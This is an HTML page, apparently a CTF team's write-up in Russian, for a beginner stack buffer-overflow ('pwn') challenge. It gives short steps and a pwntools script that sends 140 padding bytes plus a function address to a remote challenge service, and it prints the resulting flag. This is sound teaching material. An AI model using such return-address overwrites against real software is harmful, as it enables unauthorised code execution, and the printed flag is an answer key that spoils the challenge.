@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Детский сад | w33k_ctf</title>
+    <meta name="generator" content="VuePress 1.9.10">
+    
+    <meta name="description" content="">
+    
+    <link rel="preload" href="/assets/css/0.styles.8f3dca9f.css" as="style"><link rel="preload" href="/assets/js/app.d4f61409.js" as="script"><link rel="preload" href="/assets/js/2.fa7ace66.js" as="script"><link rel="preload" href="/assets/js/1.631e745b.js" as="script"><link rel="preload" href="/assets/js/31.255b82a5.js" as="script"><link rel="prefetch" href="/assets/js/10.8e2c5d19.js"><link rel="prefetch" href="/assets/js/11.20090364.js"><link rel="prefetch" href="/assets/js/12.56fca55f.js"><link rel="prefetch" href="/assets/js/13.03da223c.js"><link rel="prefetch" href="/assets/js/14.10c6843e.js"><link rel="prefetch" href="/assets/js/15.845454d7.js"><link rel="prefetch" href="/assets/js/16.9582c5d3.js"><link rel="prefetch" href="/assets/js/17.cd516f79.js"><link rel="prefetch" href="/assets/js/18.5cf32ab8.js"><link rel="prefetch" href="/assets/js/19.34204f89.js"><link rel="prefetch" href="/assets/js/20.24f07836.js"><link rel="prefetch" href="/assets/js/21.7f8f7869.js"><link rel="prefetch" href="/assets/js/22.3f20ce36.js"><link rel="prefetch" href="/assets/js/23.a4908e7f.js"><link rel="prefetch" href="/assets/js/24.35a6ffcd.js"><link rel="prefetch" href="/assets/js/25.64971222.js"><link rel="prefetch" href="/assets/js/26.1f6a4ad9.js"><link rel="prefetch" href="/assets/js/27.b4fa9200.js"><link rel="prefetch" href="/assets/js/28.7b289132.js"><link rel="prefetch" href="/assets/js/29.0937cb9d.js"><link rel="prefetch" href="/assets/js/3.64ae4e2d.js"><link rel="prefetch" href="/assets/js/30.2cc46115.js"><link rel="prefetch" href="/assets/js/32.1fe3bf90.js"><link rel="prefetch" href="/assets/js/33.e9f197d2.js"><link rel="prefetch" href="/assets/js/34.e5e43276.js"><link rel="prefetch" href="/assets/js/35.e125bc70.js"><link rel="prefetch" href="/assets/js/4.8fda9edc.js"><link rel="prefetch" href="/assets/js/5.d8fe19d3.js"><link rel="prefetch" href="/assets/js/6.d445a503.js"><link rel="prefetch" href="/assets/js/7.18e362ed.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.af85784a.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.8f3dca9f.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">w33k_ctf</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <!----></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><!---->  <!----> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="детскии-сад"><a href="#детскии-сад" class="header-anchor">#</a> Детский сад</h1> <hr> <p>Самый простой pwn с которого вообще начинают знакомство с pwn'ом</p> <ol><li>Кидаем в gdb</li> <li>Смотрим функции</li> <li>Ищем адрес</li> <li>Делаем переполнение с пейлодом в духе длина массива + адрес</li></ol> <p>Пример на pwntools:</p> <div class="language- extra-class"><pre class="language-text"><code>from pwn import *
+
+r = remote(&quot;w33k.narfu.ru&quot;, 20001)
+func_addr=p32(0x08049186)
+payload = b&quot;A&quot; * 140
+payload += func_addr
+r.sendline(payload)
+print(r.recvall())
+
+</code></pre></div><p>Падает</p> <p>b'HMM could u find a function,Haa?\nw33k{61956adcadb51190bff95bec410be21e51230355c8626f553500937201b4bd17}\nYou gonna go far kid!\n'</p> <p><strong>Флаг</strong> <code>w33k{61956adcadb51190bff95bec410be21e51230355c8626f553500937201b4bd17}</code></p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.d4f61409.js" defer></script><script src="/assets/js/2.fa7ace66.js" defer></script><script src="/assets/js/1.631e745b.js" defer></script><script src="/assets/js/31.255b82a5.js" defer></script>
+  </body>
+</html>
